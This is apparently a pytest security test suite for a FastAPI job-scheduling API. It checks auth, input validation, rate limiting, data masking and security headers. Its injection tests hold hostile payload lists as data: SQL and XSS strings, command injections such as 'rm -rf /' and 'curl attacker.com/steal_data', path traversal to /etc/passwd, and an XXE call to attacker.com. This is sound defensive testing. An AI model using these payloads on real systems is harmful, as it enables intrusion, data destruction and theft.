"""
Comprehensive API Security Tests

Extends the existing security test suite with comprehensive API-level security testing
including authentication, authorization, input validation, and attack prevention.
"""

import time
from datetime import datetime, timedelta
from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

from app.main import app
from app.tests.utils.utils import get_superuser_token_headers


@pytest.mark.security
class TestAPIAuthenticationSecurity:
    """Test API authentication security mechanisms."""

    @pytest.fixture
    def client(self) -> TestClient:
        """Create test client."""
        return TestClient(app)

    def test_unauthenticated_requests_rejected(self, client: TestClient):
        """Test that unauthenticated requests are properly rejected."""
        protected_endpoints = [
            ("GET", "/api/v1/jobs/"),
            ("POST", "/api/v1/jobs/"),
            ("GET", "/api/v1/schedules/"),
            ("POST", "/api/v1/schedules/optimize"),
            ("GET", "/api/v1/users/me"),
            ("POST", "/api/v1/users/"),
        ]

        for method, endpoint in protected_endpoints:
            if method == "GET":
                response = client.get(endpoint)
            elif method == "POST":
                response = client.post(endpoint, json={})
            else:
                response = client.request(method, endpoint)

            assert (
                response.status_code == 401
            ), f"Endpoint {method} {endpoint} should require authentication"

    def test_invalid_token_rejected(self, client: TestClient):
        """Test that invalid tokens are rejected."""
        invalid_tokens = [
            "invalid_token",
            "Bearer invalid_token",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid_payload",
            "",
            "   ",
        ]

        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            response = client.get("/api/v1/users/me", headers=headers)
            assert response.status_code == 401

    def test_expired_token_rejected(self, client: TestClient):
        """Test that expired tokens are rejected."""
        # This would need to be implemented based on your JWT library
        # For now, test with a clearly expired token format
        expired_token = (
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDk0NTkyMDB9.expired"
        )
        headers = {"Authorization": f"Bearer {expired_token}"}

        response = client.get("/api/v1/users/me", headers=headers)
        assert response.status_code == 401

    def test_malformed_authorization_header(self, client: TestClient):
        """Test handling of malformed authorization headers."""
        malformed_headers = [
            {"Authorization": "InvalidFormat token"},
            {"Authorization": "Bearer"},
            {"Authorization": "Bearer "},
            {"Authorization": "token"},
            {"Authorization": "Basic dGVzdA=="},  # Wrong auth type
        ]

        for header in malformed_headers:
            response = client.get("/api/v1/users/me", headers=header)
            assert response.status_code == 401

    def test_token_in_multiple_locations_rejected(self, client: TestClient):
        """Test that tokens in multiple locations are handled securely."""
        # Token should only be accepted in Authorization header, not in URL or body
        valid_headers = get_superuser_token_headers(client)
        token = valid_headers["Authorization"].split(" ")[1]

        # Test token in URL parameter (should be ignored/rejected)
        response = client.get(f"/api/v1/users/me?token={token}")
        assert response.status_code == 401

        # Test token in request body (should be ignored)
        response = client.post("/api/v1/jobs/", json={"token": token})
        assert response.status_code == 401


@pytest.mark.security
class TestAPIAuthorizationSecurity:
    """Test API authorization and permission controls."""

    @pytest.fixture
    def client(self) -> TestClient:
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def superuser_headers(self, client: TestClient) -> dict[str, str]:
        """Get superuser authentication headers."""
        return get_superuser_token_headers(client)

    def test_admin_only_endpoints_protected(
        self, client: TestClient, superuser_headers: dict[str, str]
    ):
        """Test that admin-only endpoints are properly protected."""
        # These endpoints should require admin privileges
        admin_endpoints = [
            ("GET", "/api/v1/users/"),
            ("POST", "/api/v1/users/"),
            ("DELETE", "/api/v1/users/{user_id}"),
            ("GET", "/api/v1/system/health"),
            ("POST", "/api/v1/system/maintenance"),
        ]

        # Test with superuser (should work)
        for method, endpoint in admin_endpoints[:2]:  # Test first few
            endpoint_path = endpoint.replace("{user_id}", str(uuid4()))

            if method == "GET":
                response = client.get(endpoint_path, headers=superuser_headers)
            elif method == "POST":
                response = client.post(
                    endpoint_path, json={}, headers=superuser_headers
                )

            # Should not be 403 (forbidden) for superuser
            assert response.status_code != 403

        # Test with regular user would need actual regular user token
        # For now, just verify the pattern exists

    def test_resource_ownership_enforced(
        self, client: TestClient, superuser_headers: dict[str, str]
    ):
        """Test that users can only access resources they own."""
        # Create a job
        job_data = {
            "job_number": "SECURITY-TEST-001",
            "customer_name": "Security Test Customer",
            "due_date": (datetime.utcnow() + timedelta(days=7)).isoformat(),
        }

        response = client.post(
            "/api/v1/jobs/", json=job_data, headers=superuser_headers
        )
        assert response.status_code == 201
        job = response.json()
        job_id = job["id"]

        # Test that valid owner can access
        response = client.get(f"/api/v1/jobs/{job_id}", headers=superuser_headers)
        assert response.status_code == 200

        # Test access with malformed IDs
        malformed_ids = [
            "not-a-uuid",
            "00000000-0000-0000-0000-000000000000",
            str(uuid4()),  # Different UUID
            "../admin",
            "../../etc/passwd",
        ]

        for malformed_id in malformed_ids:
            response = client.get(
                f"/api/v1/jobs/{malformed_id}", headers=superuser_headers
            )
            assert response.status_code in [400, 404]  # Bad request or not found

    def test_privilege_escalation_prevention(
        self, client: TestClient, superuser_headers: dict[str, str]
    ):
        """Test prevention of privilege escalation attacks."""
        # Attempt to modify user roles through various endpoints
        privilege_escalation_attempts = [
            # Attempt to create admin user
            {
                "endpoint": "/api/v1/users/",
                "data": {
                    "email": "attacker@example.com",
                    "password": "password123",
                    "is_superuser": True,
                    "role": "admin",
                },
            },
            # Attempt to modify existing user to admin
            {
                "endpoint": "/api/v1/users/me",
                "data": {
                    "is_superuser": True,
                    "role": "admin",
                    "permissions": ["admin", "superuser"],
                },
            },
        ]

        for attempt in privilege_escalation_attempts:
            response = client.post(
                attempt["endpoint"], json=attempt["data"], headers=superuser_headers
            )
            # Should either reject the request or ignore the privilege fields
            if response.status_code == 200:
                user_data = response.json()
                # Verify that privilege escalation fields were ignored
                assert (
                    not user_data.get("is_superuser", False)
                    or user_data.get("email") == "admin@example.com"
                )


@pytest.mark.security
class TestInputValidationSecurity:
    """Test input validation security mechanisms."""

    @pytest.fixture
    def client(self) -> TestClient:
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self, client: TestClient) -> dict[str, str]:
        """Get authentication headers."""
        return get_superuser_token_headers(client)

    def test_sql_injection_prevention(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test SQL injection prevention in API endpoints."""
        sql_injection_payloads = [
            "'; DROP TABLE jobs; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            "'; DELETE FROM schedules WHERE 1=1; --",
            "' OR 1=1--",
            "admin'--",
            "' WAITFOR DELAY '00:00:05'--",
        ]

        # Test in various input fields
        for payload in sql_injection_payloads:
            # Test in job creation
            job_data = {
                "job_number": payload,
                "customer_name": payload,
                "part_number": payload,
                "due_date": (datetime.utcnow() + timedelta(days=1)).isoformat(),
            }

            response = client.post("/api/v1/jobs/", json=job_data, headers=auth_headers)
            # Should either reject with validation error or sanitize input
            assert response.status_code in [400, 422, 201]

            if response.status_code == 201:
                # If created, verify data was sanitized
                job = response.json()
                assert "DROP TABLE" not in job.get("job_number", "")
                assert "DELETE FROM" not in job.get("customer_name", "")

            # Test in search parameters
            response = client.get(
                f"/api/v1/jobs/?search={payload}", headers=auth_headers
            )
            # Should not cause server error
            assert response.status_code != 500

    def test_xss_prevention(self, client: TestClient, auth_headers: dict[str, str]):
        """Test XSS prevention in API responses."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
        ]

        for payload in xss_payloads:
            job_data = {
                "job_number": f"XSS-TEST-{uuid4()}",
                "customer_name": payload,
                "notes": payload,
                "due_date": (datetime.utcnow() + timedelta(days=1)).isoformat(),
            }

            response = client.post("/api/v1/jobs/", json=job_data, headers=auth_headers)

            if response.status_code == 201:
                job = response.json()
                # Verify XSS payload was sanitized
                customer_name = job.get("customer_name", "")
                notes = job.get("notes", "")

                assert "<script>" not in customer_name
                assert "javascript:" not in customer_name
                assert "onerror=" not in customer_name
                assert "<script>" not in notes
                assert "javascript:" not in notes

    def test_command_injection_prevention(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test command injection prevention."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(id)",
            "; curl attacker.com/steal_data",
            "& net user attacker password /add",
        ]

        for payload in command_injection_payloads:
            job_data = {
                "job_number": f"CMD-TEST-{uuid4()}",
                "customer_name": f"Customer {payload}",
                "due_date": (datetime.utcnow() + timedelta(days=1)).isoformat(),
            }

            response = client.post("/api/v1/jobs/", json=job_data, headers=auth_headers)

            # Should not cause server error or command execution
            assert response.status_code != 500

            if response.status_code == 201:
                job = response.json()
                customer_name = job.get("customer_name", "")
                # Verify command injection characters were handled safely
                assert "; ls" not in customer_name
                assert "| cat" not in customer_name
                assert "&& rm" not in customer_name

    def test_path_traversal_prevention(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test path traversal attack prevention."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ]

        # Test in job ID parameter
        for payload in path_traversal_payloads:
            response = client.get(f"/api/v1/jobs/{payload}", headers=auth_headers)
            # Should return 400/404, not 500 or file contents
            assert response.status_code in [400, 404]
            assert (
                "root:" not in response.text
            )  # Should not contain passwd file content

        # Test in file upload/download endpoints (if they exist)
        for payload in path_traversal_payloads:
            # Test as filename parameter
            response = client.get(
                f"/api/v1/reports/download?filename={payload}", headers=auth_headers
            )
            # Should not return file contents or cause server error
            assert response.status_code in [
                400,
                404,
                405,
            ]  # 405 if endpoint doesn't exist

    def test_ldap_injection_prevention(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test LDAP injection prevention (if LDAP is used)."""
        ldap_injection_payloads = [
            "*",
            "*)(uid=*",
            "*)(|(uid=*",
            "admin)(&(|(uid=*",
            "*)(cn=*)",
            "*)(&(objectClass=*",
        ]

        for payload in ldap_injection_payloads:
            # Test in user search (if LDAP integration exists)
            response = client.get(
                f"/api/v1/users/?search={payload}", headers=auth_headers
            )
            # Should not cause error or return all users
            assert response.status_code != 500

    def test_xml_injection_prevention(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test XML injection and XXE prevention."""
        xml_injection_payloads = [
            '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><test>&xxe;</test>',
            '<![CDATA[<script>alert("XSS")</script>]]>',
        ]

        for payload in xml_injection_payloads:
            # Test XML payload in various fields
            job_data = {
                "job_number": f"XML-TEST-{uuid4()}",
                "notes": payload,
                "customer_name": payload,
                "due_date": (datetime.utcnow() + timedelta(days=1)).isoformat(),
            }

            response = client.post("/api/v1/jobs/", json=job_data, headers=auth_headers)

            # Should not process XML or cause XXE
            assert response.status_code != 500

            if response.status_code == 201:
                job = response.json()
                assert "file:///" not in job.get("notes", "")
                assert "<!ENTITY" not in job.get("customer_name", "")


@pytest.mark.security
class TestRateLimitingAndDOS:
    """Test rate limiting and DOS protection."""

    @pytest.fixture
    def client(self) -> TestClient:
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self, client: TestClient) -> dict[str, str]:
        """Get authentication headers."""
        return get_superuser_token_headers(client)

    def test_login_rate_limiting(self, client: TestClient):
        """Test rate limiting on login attempts."""
        # Attempt multiple rapid logins
        for i in range(10):
            response = client.post(
                "/api/v1/login/access-token",
                data={"username": f"test{i}@example.com", "password": "wrong_password"},
            )

            # After several attempts, should be rate limited
            if i >= 5:
                # Rate limiting might return 429 Too Many Requests
                assert response.status_code in [401, 429]

            # Small delay to avoid overwhelming the test
            time.sleep(0.1)

    def test_api_request_rate_limiting(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test rate limiting on API requests."""
        # Make rapid requests to an endpoint
        request_count = 0

        for _i in range(50):  # Try 50 rapid requests
            response = client.get("/api/v1/jobs/", headers=auth_headers)
            request_count += 1

            if response.status_code == 429:  # Too Many Requests
                break

            # Very small delay
            time.sleep(0.01)

        # Should either be rate limited or complete successfully
        # The exact behavior depends on rate limiting configuration
        assert request_count > 0

    def test_large_payload_handling(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test handling of large payloads to prevent DOS."""
        # Create very large job description
        large_payload = {
            "job_number": "LARGE-PAYLOAD-TEST",
            "customer_name": "Test Customer",
            "notes": "A" * 100000,  # 100KB of text
            "due_date": (datetime.utcnow() + timedelta(days=1)).isoformat(),
        }

        response = client.post(
            "/api/v1/jobs/", json=large_payload, headers=auth_headers
        )

        # Should either accept (if within limits) or reject (413 Payload Too Large)
        assert response.status_code in [201, 413, 422]

    def test_concurrent_request_handling(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test handling of concurrent requests."""
        import threading

        results = []

        def make_request():
            response = client.get("/api/v1/jobs/", headers=auth_headers)
            results.append(response.status_code)

        # Create multiple concurrent requests
        threads = []
        for _ in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)

        # Start all threads
        for thread in threads:
            thread.start()

        # Wait for completion
        for thread in threads:
            thread.join()

        # Verify no server errors occurred
        assert all(status != 500 for status in results)
        assert len(results) == 10


@pytest.mark.security
class TestDataProtectionSecurity:
    """Test data protection and privacy security."""

    @pytest.fixture
    def client(self) -> TestClient:
        """Create test client."""
        return TestClient(app)

    @pytest.fixture
    def auth_headers(self, client: TestClient) -> dict[str, str]:
        """Get authentication headers."""
        return get_superuser_token_headers(client)

    def test_sensitive_data_not_exposed(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that sensitive data is not exposed in responses."""
        # Create a job with potentially sensitive information
        job_data = {
            "job_number": "SENSITIVE-TEST-001",
            "customer_name": "Sensitive Customer Corp",
            "notes": "Contains sensitive information: SSN 123-45-6789, Credit Card 1234-5678-9012-3456",
            "due_date": (datetime.utcnow() + timedelta(days=1)).isoformat(),
        }

        response = client.post("/api/v1/jobs/", json=job_data, headers=auth_headers)
        assert response.status_code == 201
        job = response.json()

        # Verify sensitive patterns are not returned as-is
        notes = job.get("notes", "")
        # Check if sensitive data was masked or removed
        assert "123-45-6789" not in notes or "***-**-****" in notes
        assert "1234-5678-9012-3456" not in notes or "**** **** **** ****" in notes

    def test_password_not_returned(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that password fields are never returned in responses."""
        # Get user information
        response = client.get("/api/v1/users/me", headers=auth_headers)
        assert response.status_code == 200
        user = response.json()

        # Verify password-related fields are not present
        sensitive_fields = ["password", "hashed_password", "password_hash", "pwd"]
        for field in sensitive_fields:
            assert field not in user

    def test_audit_logging_for_sensitive_operations(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that sensitive operations are logged."""
        # Perform sensitive operations
        sensitive_operations = [
            (
                "POST",
                "/api/v1/jobs/",
                {"job_number": "AUDIT-TEST", "due_date": datetime.utcnow().isoformat()},
            ),
            ("GET", "/api/v1/users/me", None),
        ]

        for method, endpoint, data in sensitive_operations:
            if method == "POST" and data:
                response = client.post(endpoint, json=data, headers=auth_headers)
            else:
                response = client.get(endpoint, headers=auth_headers)

            # Operations should succeed
            assert response.status_code in [200, 201]

        # Check audit logs (if audit endpoint exists)
        response = client.get("/api/v1/audit/recent", headers=auth_headers)
        if response.status_code == 200:
            # Verify sensitive operations were logged
            audit_logs = response.json()
            assert len(audit_logs.get("events", [])) > 0

    def test_data_masking_in_logs(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that sensitive data is masked in log outputs."""
        # This test would check log files or log endpoints
        # For now, verify that error responses don't expose sensitive data

        # Trigger an error with sensitive data
        job_data = {
            "job_number": "",  # Invalid to trigger error
            "customer_name": "Customer with SSN 123-45-6789",
            "due_date": "invalid-date",
        }

        response = client.post("/api/v1/jobs/", json=job_data, headers=auth_headers)
        assert response.status_code == 422

        error_text = response.text
        # Verify sensitive data is not exposed in error messages
        assert "123-45-6789" not in error_text


@pytest.mark.security
class TestSessionAndCookieSecurity:
    """Test session and cookie security."""

    @pytest.fixture
    def client(self) -> TestClient:
        """Create test client."""
        return TestClient(app)

    def test_secure_cookie_settings(self, client: TestClient):
        """Test that cookies have secure settings."""
        response = client.post(
            "/api/v1/login/access-token",
            data={"username": "admin@example.com", "password": "changethis"},
        )

        if response.status_code == 200:
            # Check cookie security settings
            cookies = response.cookies
            for _cookie_name, cookie in cookies.items():
                # Verify security attributes
                assert (
                    cookie.get("secure") is not False
                )  # Should be secure in production
                assert cookie.get("httponly") is not False  # Should be HTTP-only
                assert (
                    cookie.get("samesite") is not None
                )  # Should have SameSite attribute

    def test_session_fixation_prevention(self, client: TestClient):
        """Test session fixation attack prevention."""
        # This would test that session IDs change after authentication
        # Implementation depends on session management approach

        # Get initial session (if sessions are used)
        response1 = client.get("/api/v1/login")

        # Login
        response2 = client.post(
            "/api/v1/login/access-token",
            data={"username": "admin@example.com", "password": "changethis"},
        )

        # Verify session changed (if using session-based auth)
        if response1.cookies and response2.cookies:
            session1 = response1.cookies.get("session_id")
            session2 = response2.cookies.get("session_id")

            if session1 and session2:
                assert session1 != session2

    def test_session_timeout(self, client: TestClient):
        """Test session timeout functionality."""
        # Login to get token
        response = client.post(
            "/api/v1/login/access-token",
            data={"username": "admin@example.com", "password": "changethis"},
        )

        if response.status_code == 200:
            token = response.json().get("access_token")
            headers = {"Authorization": f"Bearer {token}"}

            # Make request immediately (should work)
            response = client.get("/api/v1/users/me", headers=headers)
            assert response.status_code == 200

            # In a real test, you would wait for token expiration
            # For now, just verify the token has an expiration


@pytest.mark.security
class TestSecurityHeaders:
    """Test security headers in responses."""

    @pytest.fixture
    def client(self) -> TestClient:
        """Create test client."""
        return TestClient(app)

    def test_security_headers_present(self, client: TestClient):
        """Test that security headers are present in responses."""
        response = client.get("/api/v1/")

        expected_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": lambda x: "max-age=" in x,
            "Content-Security-Policy": lambda x: len(x) > 0,
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }

        for header_name, expected_value in expected_headers.items():
            actual_value = response.headers.get(header_name)

            if callable(expected_value):
                # Custom validation function
                if actual_value:
                    assert expected_value(actual_value)
            else:
                # Direct comparison
                assert (
                    actual_value == expected_value
                ), f"Header {header_name} should be {expected_value}, got {actual_value}"

    def test_cors_headers_configured(self, client: TestClient):
        """Test CORS headers are properly configured."""
        # Test preflight request
        response = client.options(
            "/api/v1/jobs/",
            headers={
                "Origin": "http://localhost:3000",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Authorization,Content-Type",
            },
        )

        # Should allow the request or return proper CORS headers
        if response.status_code == 200:
            assert "Access-Control-Allow-Origin" in response.headers
            assert "Access-Control-Allow-Methods" in response.headers
            assert "Access-Control-Allow-Headers" in response.headers

    def test_no_server_information_leaked(self, client: TestClient):
        """Test that server information is not leaked in headers."""
        response = client.get("/api/v1/")

        # Headers that shouldn't expose server information
        sensitive_headers = ["Server", "X-Powered-By", "X-AspNet-Version"]

        for header in sensitive_headers:
            server_info = response.headers.get(header, "")
            # Should not contain detailed version information
            assert "Apache/" not in server_info
            assert "nginx/" not in server_info
            assert "Microsoft-IIS/" not in server_info
            assert "PHP/" not in server_info


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
